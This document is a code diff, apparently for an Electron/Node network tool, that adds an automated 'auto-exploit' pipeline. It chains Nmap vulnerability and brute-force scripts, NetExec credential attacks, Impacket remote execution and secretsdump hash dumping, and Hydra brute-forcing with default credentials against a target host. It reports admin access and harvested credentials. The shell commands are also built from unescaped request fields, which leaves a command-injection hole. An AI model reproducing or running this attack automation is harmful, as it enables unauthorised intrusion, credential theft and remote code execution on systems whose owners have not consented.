@@ -287,6 +287,55 @@ function handleApiRequest(urlPath, method, body, res) {
         return;
     }
 
+    // Detect installed exploitation tools
+    if (urlPath === '/api/detect-tools' && method === 'GET') {
+        detectInstalledTools((tools) => {
+            res.writeHead(200);
+            res.end(JSON.stringify({ tools, count: Object.keys(tools).length }));
+        });
+        return;
+    }
+
+    // Nmap vulnerability scan
+    if (urlPath === '/api/nmap-scan' && method === 'POST') {
+        const data = JSON.parse(body);
+        nmapVulnScan(data.host, data.openPorts || [], (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // NetExec multi-protocol exploit
+    if (urlPath === '/api/exploit-nxc' && method === 'POST') {
+        const data = JSON.parse(body);
+        nxcFullExploit(data.host, data.openPorts || [], data.credentials || [], (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Impacket exploit
+    if (urlPath === '/api/exploit-impacket' && method === 'POST') {
+        const data = JSON.parse(body);
+        impacketFullExploit(data.host, data.credentials || [], (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Hydra brute-force
+    if (urlPath === '/api/exploit-hydra' && method === 'POST') {
+        const data = JSON.parse(body);
+        hydraBrute(data.host, data.port, data.service, data.credentials || [], (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
     // Full auto-exploit: tries all methods against a host
     if (urlPath === '/api/auto-exploit' && method === 'POST') {
         const data = JSON.parse(body);
@@ -808,6 +857,433 @@ function collectPostExploitData(host, method, callback) {
     });
 }
 
+// ===== INTEGRATED TOOLS DETECTION =====
+const toolCache = {};
+
+function checkTool(toolName, callback) {
+    if (toolCache[toolName] !== undefined) {
+        callback(toolCache[toolName]);
+        return;
+    }
+    const isWin = process.platform === 'win32';
+    const cmd = isWin ? `where ${toolName} 2>nul` : `which ${toolName} 2>/dev/null`;
+    exec(cmd, { timeout: 3000 }, (err, stdout) => {
+        toolCache[toolName] = !err && stdout.trim().length > 0 ? stdout.trim() : null;
+        callback(toolCache[toolName]);
+    });
+}
+
+function checkPythonTool(toolName, callback) {
+    if (toolCache[toolName] !== undefined) {
+        callback(toolCache[toolName]);
+        return;
+    }
+    exec(`python3 -c "import ${toolName}" 2>/dev/null || python -c "import ${toolName}" 2>/dev/null`, { timeout: 3000 }, (err) => {
+        toolCache[toolName] = !err;
+        callback(!err);
+    });
+}
+
+// ===== NETEXEC (nxc) INTEGRATION =====
+// NetExec is the successor to CrackMapExec - the most powerful network exploitation tool
+// Supports: SMB, SSH, WinRM, RDP, LDAP, MSSQL, FTP, VNC
+
+function nxcExploit(host, protocol, username, password, callback) {
+    checkTool('nxc', (nxcPath) => {
+        if (!nxcPath) {
+            checkTool('netexec', (nePath) => {
+                if (!nePath) {
+                    checkTool('crackmapexec', (cmePath) => {
+                        if (!cmePath) {
+                            callback({ success: false, method: `NetExec-${protocol}`, error: 'NetExec/CrackMapExec not installed', toolMissing: true });
+                            return;
+                        }
+                        runNxcCommand(cmePath, host, protocol, username, password, callback);
+                    });
+                    return;
+                }
+                runNxcCommand(nePath, host, protocol, username, password, callback);
+            });
+            return;
+        }
+        runNxcCommand(nxcPath, host, protocol, username, password, callback);
+    });
+}
+
+function runNxcCommand(nxcBin, host, protocol, username, password, callback) {
+    const passArg = password ? `-p '${password.replace(/'/g, "\\'")}'` : `-p ''`;
+    const cmd = `${nxcBin} ${protocol} ${host} -u '${username}' ${passArg} --timeout 10 2>&1`;
+    exec(cmd, { timeout: 30000 }, (error, stdout) => {
+        const output = stdout || '';
+        const success = output.includes('[+]') || output.includes('Pwn3d!');
+        const admin = output.includes('Pwn3d!') || output.includes('(admin)') || output.includes('STATUS_SUCCESS');
+
+        if (success) {
+            // Try to get more info
+            const infoCmd = protocol === 'smb' ?
+                `${nxcBin} smb ${host} -u '${username}' ${passArg} --shares --users --sessions 2>&1` :
+                protocol === 'ssh' ?
+                    `${nxcBin} ssh ${host} -u '${username}' ${passArg} -x 'id && uname -a && hostname' 2>&1` :
+                    protocol === 'winrm' ?
+                        `${nxcBin} winrm ${host} -u '${username}' ${passArg} -x 'whoami && systeminfo' 2>&1` :
+                        protocol === 'mssql' ?
+                            `${nxcBin} mssql ${host} -u '${username}' ${passArg} -q 'SELECT @@version' 2>&1` :
+                            null;
+
+            if (infoCmd) {
+                exec(infoCmd, { timeout: 20000 }, (e2, info) => {
+                    callback({
+                        success: true, method: `NetExec-${protocol.toUpperCase()}`, host, username,
+                        admin, info: `${protocol.toUpperCase()} access gained${admin ? ' (ADMIN)' : ''}`,
+                        sysInfo: (info || output).substring(0, 1000)
+                    });
+                });
+            } else {
+                callback({
+                    success: true, method: `NetExec-${protocol.toUpperCase()}`, host, username,
+                    admin, info: `${protocol.toUpperCase()} access gained${admin ? ' (ADMIN)' : ''}`,
+                    sysInfo: output.substring(0, 500)
+                });
+            }
+        } else {
+            callback({ success: false, method: `NetExec-${protocol.toUpperCase()}`, host, username, info: output.substring(0, 200) });
+        }
+    });
+}
+
+// Multi-protocol NetExec exploitation
+function nxcFullExploit(host, openPorts, credentials, callback) {
+    const portSet = new Set(openPorts.map(p => typeof p === 'number' ? p : p.port));
+    const protocols = [];
+    if (portSet.has(445) || portSet.has(139)) protocols.push('smb');
+    if (portSet.has(22)) protocols.push('ssh');
+    if (portSet.has(5985) || portSet.has(5986)) protocols.push('winrm');
+    if (portSet.has(3389)) protocols.push('rdp');
+    if (portSet.has(1433)) protocols.push('mssql');
+    if (portSet.has(21)) protocols.push('ftp');
+    if (portSet.has(389) || portSet.has(636)) protocols.push('ldap');
+
+    if (protocols.length === 0) {
+        callback({ success: false, method: 'NetExec', info: 'No supported NetExec protocols' });
+        return;
+    }
+
+    let pending = 0;
+    const results = [];
+    let found = false;
+
+    for (const proto of protocols) {
+        for (const cred of credentials) {
+            if (found) break;
+            pending++;
+            nxcExploit(host, proto, cred.username, cred.password, (r) => {
+                results.push(r);
+                if (r.success && !found) found = true;
+                pending--;
+                if (pending <= 0 || found) {
+                    const best = results.find(r2 => r2.success);
+                    callback(best || { success: false, method: 'NetExec', allResults: results, info: `NetExec: ${results.length} attempts failed` });
+                }
+            });
+        }
+        if (found) break;
+    }
+
+    if (pending === 0) {
+        callback({ success: false, method: 'NetExec', info: 'No attempts made' });
+    }
+}
+
+// ===== IMPACKET INTEGRATION =====
+// Impacket provides psexec, smbexec, wmiexec, secretsdump, etc.
+
+function impacketExploit(host, username, password, tool, callback) {
+    const toolMap = {
+        psexec: 'impacket-psexec',
+        smbexec: 'impacket-smbexec',
+        wmiexec: 'impacket-wmiexec',
+        atexec: 'impacket-atexec',
+        dcomexec: 'impacket-dcomexec',
+        secretsdump: 'impacket-secretsdump'
+    };
+
+    const toolBin = toolMap[tool] || `impacket-${tool}`;
+    const altBin = `${tool}.py`;
+
+    checkTool(toolBin, (toolPath) => {
+        const binToUse = toolPath || null;
+        if (!binToUse) {
+            checkTool(altBin, (altPath) => {
+                if (!altPath) {
+                    callback({ success: false, method: `Impacket-${tool}`, error: `${toolBin} not installed`, toolMissing: true });
+                    return;
+                }
+                runImpacketCommand(altPath, host, username, password, tool, callback);
+            });
+            return;
+        }
+        runImpacketCommand(binToUse, host, username, password, tool, callback);
+    });
+}
+
+function runImpacketCommand(binPath, host, username, password, tool, callback) {
+    const escapedPass = password.replace(/'/g, "\\'");
+    let cmd;
+
+    if (tool === 'secretsdump') {
+        cmd = `${binPath} '${username}':'${escapedPass}'@${host} 2>&1`;
+    } else {
+        const execCmd = tool === 'psexec' || tool === 'smbexec' || tool === 'wmiexec' ?
+            `'echo MONKEY_IMPLANT_SUCCESS && whoami && systeminfo /FO CSV 2>nul || uname -a 2>/dev/null'` :
+            `'echo MONKEY_IMPLANT_SUCCESS && whoami'`;
+        cmd = `${binPath} '${username}':'${escapedPass}'@${host} ${execCmd} 2>&1`;
+    }
+
+    exec(cmd, { timeout: 30000 }, (error, stdout) => {
+        const output = stdout || '';
+        const success = output.includes('MONKEY_IMPLANT_SUCCESS') ||
+            (tool === 'secretsdump' && (output.includes('SAM hashes') || output.includes('NTLM') || output.includes(':::') || output.includes('Administrator')));
+
+        callback({
+            success, method: `Impacket-${tool}`, host, username,
+            admin: success,
+            info: success ? `${tool} remote execution successful` : `${tool} failed`,
+            sysInfo: success ? output.substring(0, 1000) : null
+        });
+    });
+}
+
+function impacketFullExploit(host, credentials, callback) {
+    const tools = ['psexec', 'smbexec', 'wmiexec', 'atexec', 'secretsdump'];
+    let pending = 0;
+    const results = [];
+    let found = false;
+
+    for (const tool of tools) {
+        for (const cred of credentials.slice(0, 5)) {
+            if (found) break;
+            pending++;
+            impacketExploit(host, cred.username, cred.password, tool, (r) => {
+                results.push(r);
+                if (r.success && !found) found = true;
+                pending--;
+                if (pending <= 0 || found) {
+                    const best = results.find(r2 => r2.success);
+                    callback(best || { success: false, method: 'Impacket', allResults: results, info: `Impacket: ${results.length} attempts failed` });
+                }
+            });
+        }
+        if (found) break;
+    }
+
+    if (pending === 0) {
+        callback({ success: false, method: 'Impacket', info: 'No Impacket tools available' });
+    }
+}
+
+// ===== NMAP NSE INTEGRATION =====
+// Nmap with NSE scripts for advanced vulnerability scanning
+
+function nmapVulnScan(host, ports, callback) {
+    checkTool('nmap', (nmapPath) => {
+        if (!nmapPath) {
+            callback({ success: false, error: 'Nmap not installed', toolMissing: true, vulns: [] });
+            return;
+        }
+
+        const portStr = ports.map(p => typeof p === 'number' ? p : p.port).join(',');
+        const scripts = [
+            'vuln', 'exploit', 'auth', 'default',
+            'smb-vuln-ms17-010', 'smb-vuln-ms08-067',
+            'ssh-auth-methods', 'ftp-anon', 'ftp-vsftpd-backdoor',
+            'http-vuln-cve2017-5638', 'mysql-empty-password',
+            'redis-info', 'mongodb-info'
+        ].join(',');
+
+        const cmd = `${nmapPath} -sV -sC --script=${scripts} -p ${portStr} ${host} -oN - --open 2>&1`;
+
+        exec(cmd, { timeout: 120000 }, (error, stdout) => {
+            const output = stdout || '';
+            const vulns = [];
+
+            // Parse vulnerability results
+            const vulnMatches = output.match(/VULNERABLE[\s\S]*?(?=\n\n|\n[A-Z]|$)/g);
+            if (vulnMatches) {
+                vulnMatches.forEach(v => {
+                    const titleMatch = v.match(/\|([^|]+):/);
+                    vulns.push({
+                        name: titleMatch ? titleMatch[1].trim() : 'Unknown Vulnerability',
+                        details: v.substring(0, 300)
+                    });
+                });
+            }
+
+            // Check for specific findings
+            if (output.includes('Anonymous FTP login allowed')) vulns.push({ name: 'FTP Anonymous Access', details: 'Anonymous FTP login allowed' });
+            if (output.includes('ms17-010') || output.includes('VULNERABLE')) vulns.push({ name: 'MS17-010 (EternalBlue)', details: 'SMB vulnerability detected' });
+            if (output.includes('ms08-067')) vulns.push({ name: 'MS08-067 (Conficker)', details: 'SMB vulnerability detected' });
+            if (output.includes('empty-password') || output.includes('root.*EMPTY')) vulns.push({ name: 'Empty Password', details: 'Service accepts empty password' });
+            if (output.includes('vsftpd')) vulns.push({ name: 'vsFTPd Backdoor', details: 'vsFTPd backdoor vulnerability' });
+
+            // Parse service versions
+            const services = [];
+            const svcMatches = output.match(/(\d+)\/tcp\s+open\s+(\S+)\s+(.*)/g);
+            if (svcMatches) {
+                svcMatches.forEach(s => {
+                    const parts = s.match(/(\d+)\/tcp\s+open\s+(\S+)\s+(.*)/);
+                    if (parts) services.push({ port: parseInt(parts[1]), service: parts[2], version: parts[3].trim() });
+                });
+            }
+
+            callback({
+                success: true, host,
+                vulns, services,
+                rawOutput: output.substring(0, 2000),
+                info: `Nmap found ${vulns.length} vulnerabilities, ${services.length} services`
+            });
+        });
+    });
+}
+
+// Nmap brute-force scripts
+function nmapBrute(host, port, service, callback) {
+    checkTool('nmap', (nmapPath) => {
+        if (!nmapPath) {
+            callback({ success: false, error: 'Nmap not installed', toolMissing: true });
+            return;
+        }
+
+        const scriptMap = {
+            ssh: 'ssh-brute',
+            ftp: 'ftp-brute',
+            telnet: 'telnet-brute',
+            mysql: 'mysql-brute',
+            mssql: 'ms-sql-brute',
+            postgresql: 'pgsql-brute',
+            smb: 'smb-brute',
+            vnc: 'vnc-brute',
+            http: 'http-brute',
+            rdp: 'rdp-brute'
+        };
+
+        const script = scriptMap[service] || `${service}-brute`;
+        const cmd = `${nmapPath} --script=${script} -p ${port} ${host} 2>&1`;
+
+        exec(cmd, { timeout: 60000 }, (error, stdout) => {
+            const output = stdout || '';
+            const success = output.includes('Valid credentials') || output.includes('Account:') || output.includes('login:');
+
+            let username = null;
+            let password = null;
+            const credMatch = output.match(/(?:Account|login):\s*(\S+)\s*-\s*(?:Password|password):\s*(\S+)/i) ||
+                output.match(/Valid credentials:\s*(\S+)\s*:\s*(\S+)/i);
+            if (credMatch) {
+                username = credMatch[1];
+                password = credMatch[2];
+            }
+
+            callback({
+                success, method: `Nmap-${service}-brute`, host,
+                username, password,
+                info: success ? `Nmap brute-force found credentials: ${username}:${password}` : 'Nmap brute-force failed',
+                sysInfo: output.substring(0, 500)
+            });
+        });
+    });
+}
+
+// ===== Hydra INTEGRATION =====
+// THC Hydra - fast network brute-forcer
+
+function hydraExploit(host, port, service, username, password, callback) {
+    checkTool('hydra', (hydraPath) => {
+        if (!hydraPath) {
+            callback({ success: false, method: `Hydra-${service}`, error: 'Hydra not installed', toolMissing: true });
+            return;
+        }
+
+        const escapedPass = password.replace(/'/g, "\\'");
+        const cmd = `${hydraPath} -l '${username}' -p '${escapedPass}' ${host} ${service} -s ${port} -t 4 -f 2>&1`;
+
+        exec(cmd, { timeout: 30000 }, (error, stdout) => {
+            const output = stdout || '';
+            const success = output.includes('[' + port + ']') && (output.includes('login:') || output.includes('host:'));
+
+            callback({
+                success, method: `Hydra-${service}`, host, username,
+                info: success ? `Hydra ${service} brute-force successful` : `Hydra ${service} failed`,
+                sysInfo: success ? output.substring(0, 500) : null
+            });
+        });
+    });
+}
+
+// Hydra multi-credential brute-force
+function hydraBrute(host, port, service, credentials, callback) {
+    checkTool('hydra', (hydraPath) => {
+        if (!hydraPath) {
+            callback({ success: false, method: `Hydra-${service}`, error: 'Hydra not installed', toolMissing: true });
+            return;
+        }
+
+        // Create temp user/pass lists
+        const tmpDir = path.join(app.getPath('userData'), 'tmp');
+        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
+
+        const userFile = path.join(tmpDir, 'users.txt');
+        const passFile = path.join(tmpDir, 'passwords.txt');
+
+        const users = [...new Set(credentials.map(c => c.username))];
+        const passwords = [...new Set(credentials.map(c => c.password))];
+
+        fs.writeFileSync(userFile, users.join('\n'));
+        fs.writeFileSync(passFile, passwords.join('\n'));
+
+        const cmd = `${hydraPath} -L '${userFile}' -P '${passFile}' ${host} ${service} -s ${port} -t 4 -f 2>&1`;
+
+        exec(cmd, { timeout: 120000 }, (error, stdout) => {
+            const output = stdout || '';
+            const success = output.includes('login:') || output.includes('host:');
+
+            let foundUser = null;
+            let foundPass = null;
+            const credMatch = output.match(/login:\s*(\S+)\s+password:\s*(\S+)/i);
+            if (credMatch) {
+                foundUser = credMatch[1];
+                foundPass = credMatch[2];
+            }
+
+            // Clean up temp files
+            try { fs.unlinkSync(userFile); fs.unlinkSync(passFile); } catch {}
+
+            callback({
+                success, method: `Hydra-${service}`, host,
+                username: foundUser, password: foundPass,
+                info: success ? `Hydra found creds: ${foundUser}:${foundPass}` : 'Hydra brute-force failed',
+                sysInfo: success ? output.substring(0, 500) : null
+            });
+        });
+    });
+}
+
+// ===== ENHANCED AUTO-EXPLOIT WITH ALL INTEGRATED TOOLS =====
+function detectInstalledTools(callback) {
+    const tools = ['nxc', 'netexec', 'crackmapexec', 'nmap', 'hydra',
+        'impacket-psexec', 'impacket-smbexec', 'impacket-wmiexec',
+        'impacket-secretsdump', 'psexec.py', 'smbexec.py', 'wmiexec.py'];
+
+    let pending = tools.length;
+    const available = {};
+
+    tools.forEach(tool => {
+        checkTool(tool, (path2) => {
+            if (path2) available[tool] = path2;
+            pending--;
+            if (pending <= 0) callback(available);
+        });
+    });
+}
+
 // ===== DEFAULT CREDENTIAL DICTIONARY =====
 const DEFAULT_CREDENTIALS = [
     { username: 'root', password: 'root' },
@@ -1078,55 +1554,18 @@ function attemptVNCExploit(host, callback) {
 }
 
 // ===== AUTO-EXPLOIT: Tries everything against a host =====
+// Phase 1: Nmap vuln scan (if available)
+// Phase 2: NetExec multi-protocol (if available)
+// Phase 3: Impacket tools (if available, for Windows targets)
+// Phase 4: Hydra brute-force (if available)
+// Phase 5: Built-in TCP exploits (always available as fallback)
 function autoExploit(host, openPorts, userCredentials, callback) {
     const portSet = new Set(openPorts.map(p => typeof p === 'number' ? p : p.port));
     const allCreds = [...userCredentials, ...DEFAULT_CREDENTIALS];
     const results = [];
-    let pending = 0;
     let bestResult = null;
 
-    function checkDone() {
-        pending--;
-        if (pending <= 0) {
-            // Return the best result (first successful one, or summary of all attempts)
-            const success = results.find(r => r.success);
-            callback({
-                success: !!success,
-                method: success ? success.method : 'None',
-                host,
-                bestResult: success || null,
-                allResults: results,
-                info: success ? `Exploited via ${success.method} (${success.username || 'no-auth'})` : `All ${results.length} exploitation attempts failed`,
-                username: success ? success.username : null,
-                sysInfo: success ? success.sysInfo : null
-            });
-        }
-    }
-
-    // No-auth exploits (don't need credentials)
-    if (portSet.has(6379)) {
-        pending++;
-        attemptRedisExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
-    }
-    if (portSet.has(27017)) {
-        pending++;
-        attemptMongoExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
-    }
-    if (portSet.has(5900)) {
-        pending++;
-        attemptVNCExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
-    }
-
-    // FTP anonymous
-    if (portSet.has(21)) {
-        pending++;
-        attemptFTPExploit(host, 'anonymous', 'anonymous@', (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; checkDone(); });
-    }
-
-    // Credential-based exploits - try each credential pair
-    const credExploits = [];
-
-    // Limit brute-force to first 10 unique credential pairs to avoid excessive time
+    // Deduplicate credentials
     const uniqueCreds = [];
     const seen = new Set();
     for (const c of allCreds) {
@@ -1134,68 +1573,139 @@ function autoExploit(host, openPorts, userCredentials, callback) {
         if (!seen.has(key)) {
             seen.add(key);
             uniqueCreds.push(c);
-            if (uniqueCreds.length >= 15) break;
+            if (uniqueCreds.length >= 20) break;
         }
     }
 
-    for (const cred of uniqueCreds) {
-        if (portSet.has(22)) {
-            credExploits.push({ fn: attemptSSHExploit, port: 22, ...cred });
-        }
-        if (portSet.has(445)) {
-            credExploits.push({ fn: attemptSMBExploit, port: 445, ...cred });
-        }
-        if (portSet.has(21)) {
-            credExploits.push({ fn: attemptFTPExploit, port: 21, ...cred });
-        }
-        if (portSet.has(23)) {
-            credExploits.push({ fn: attemptTelnetExploit, port: 23, ...cred });
-        }
-        if (portSet.has(3306)) {
-            credExploits.push({ fn: attemptMySQLExploit, port: 3306, ...cred });
-        }
-        if (portSet.has(5432)) {
-            credExploits.push({ fn: attemptPostgresExploit, port: 5432, ...cred });
-        }
-    }
+    // Detect available tools first
+    detectInstalledTools((tools) => {
+        const hasNxc = tools['nxc'] || tools['netexec'] || tools['crackmapexec'];
+        const hasImpacket = tools['impacket-psexec'] || tools['impacket-smbexec'] || tools['psexec.py'];
+        const hasNmap = tools['nmap'];
+        const hasHydra = tools['hydra'];
 
-    // Run credential exploits in batches (3 concurrent)
-    let credIndex = 0;
-    const BATCH_SIZE = 3;
-    let credPending = credExploits.length;
-    pending += credPending;
+        let phasesComplete = 0;
+        const totalPhases = 5;
 
-    if (credPending === 0 && pending === 0) {
-        callback({
-            success: false, method: 'None', host,
-            allResults: results,
-            info: 'No exploitable ports found'
-        });
-        return;
-    }
+        function phaseComplete(phaseName) {
+            phasesComplete++;
+            // Check if we already have a success
+            if (bestResult) {
+                finishExploit();
+                return;
+            }
+            if (phasesComplete >= totalPhases) {
+                finishExploit();
+            }
+        }
 
-    function runNextCredBatch() {
-        while (credIndex < credExploits.length) {
-            const batch = credExploits.slice(credIndex, credIndex + BATCH_SIZE);
-            credIndex += BATCH_SIZE;
-            batch.forEach(exploit => {
-                exploit.fn(host, exploit.username, exploit.password, (r) => {
-                    results.push(r);
-                    if (r.success && !bestResult) bestResult = r;
-                    checkDone();
-                    // If we found success, no need to continue more batches
-                    if (!bestResult) {
-                        runNextCredBatch();
-                    }
-                });
+        function finishExploit() {
+            const success = results.find(r => r.success);
+            if (success && !bestResult) bestResult = success;
+            callback({
+                success: !!bestResult,
+                method: bestResult ? bestResult.method : 'None',
+                host,
+                bestResult: bestResult || null,
+                allResults: results,
+                toolsUsed: Object.keys(tools),
+                info: bestResult ?
+                    `Exploited via ${bestResult.method} (${bestResult.username || 'no-auth'})${bestResult.admin ? ' [ADMIN]' : ''}` :
+                    `All ${results.length} exploitation attempts failed`,
+                username: bestResult ? bestResult.username : null,
+                admin: bestResult ? bestResult.admin : false,
+                sysInfo: bestResult ? bestResult.sysInfo : null
             });
-            break; // Only start one batch, next batch triggered by callback
         }
-    }
 
-    if (credExploits.length > 0) {
-        runNextCredBatch();
-    }
+        // Phase 1: Nmap vulnerability scan
+        if (hasNmap && openPorts.length > 0) {
+            nmapVulnScan(host, openPorts, (nmapResult) => {
+                if (nmapResult.vulns && nmapResult.vulns.length > 0) {
+                    results.push({ ...nmapResult, method: 'Nmap-VulnScan' });
+                }
+                phaseComplete('nmap');
+            });
+        } else {
+            phaseComplete('nmap');
+        }
+
+        // Phase 2: NetExec multi-protocol exploitation
+        if (hasNxc) {
+            nxcFullExploit(host, openPorts, uniqueCreds.slice(0, 8), (nxcResult) => {
+                results.push(nxcResult);
+                if (nxcResult.success && !bestResult) bestResult = nxcResult;
+                phaseComplete('netexec');
+            });
+        } else {
+            phaseComplete('netexec');
+        }
+
+        // Phase 3: Impacket tools (Windows targets - SMB ports)
+        if (hasImpacket && (portSet.has(445) || portSet.has(139))) {
+            impacketFullExploit(host, uniqueCreds.slice(0, 5), (impResult) => {
+                results.push(impResult);
+                if (impResult.success && !bestResult) bestResult = impResult;
+                phaseComplete('impacket');
+            });
+        } else {
+            phaseComplete('impacket');
+        }
+
+        // Phase 4: Hydra brute-force
+        if (hasHydra) {
+            const hydraTargets = [];
+            if (portSet.has(22)) hydraTargets.push({ port: 22, service: 'ssh' });
+            if (portSet.has(21)) hydraTargets.push({ port: 21, service: 'ftp' });
+            if (portSet.has(445)) hydraTargets.push({ port: 445, service: 'smb' });
+            if (portSet.has(3306)) hydraTargets.push({ port: 3306, service: 'mysql' });
+            if (portSet.has(5432)) hydraTargets.push({ port: 5432, service: 'postgres' });
+            if (portSet.has(3389)) hydraTargets.push({ port: 3389, service: 'rdp' });
+
+            if (hydraTargets.length > 0) {
+                let hydraDone = 0;
+                hydraTargets.forEach(target => {
+                    hydraBrute(host, target.port, target.service, uniqueCreds, (hydraResult) => {
+                        results.push(hydraResult);
+                        if (hydraResult.success && !bestResult) bestResult = hydraResult;
+                        hydraDone++;
+                        if (hydraDone >= hydraTargets.length) phaseComplete('hydra');
+                    });
+                });
+            } else {
+                phaseComplete('hydra');
+            }
+        } else {
+            phaseComplete('hydra');
+        }
+
+        // Phase 5: Built-in TCP exploits (always available)
+        let builtinPending = 0;
+        let builtinDone = 0;
+
+        function builtinCheck() {
+            builtinDone++;
+            if (builtinDone >= builtinPending) phaseComplete('builtin');
+        }
+
+        // No-auth exploits
+        if (portSet.has(6379)) { builtinPending++; attemptRedisExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+        if (portSet.has(27017)) { builtinPending++; attemptMongoExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+        if (portSet.has(5900)) { builtinPending++; attemptVNCExploit(host, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+        if (portSet.has(21)) { builtinPending++; attemptFTPExploit(host, 'anonymous', 'anonymous@', (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+
+        // Credential-based built-in exploits
+        for (const cred of uniqueCreds.slice(0, 8)) {
+            if (portSet.has(22)) { builtinPending++; attemptSSHExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+            if (portSet.has(445)) { builtinPending++; attemptSMBExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+            if (portSet.has(21)) { builtinPending++; attemptFTPExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+            if (portSet.has(23)) { builtinPending++; attemptTelnetExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+            if (portSet.has(3306)) { builtinPending++; attemptMySQLExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+            if (portSet.has(5432)) { builtinPending++; attemptPostgresExploit(host, cred.username, cred.password, (r) => { results.push(r); if (r.success && !bestResult) bestResult = r; builtinCheck(); }); }
+        }
+
+        if (builtinPending === 0) phaseComplete('builtin');
+    });
 }
 
 // No separate Next.js server needed - static files served by the combined app server
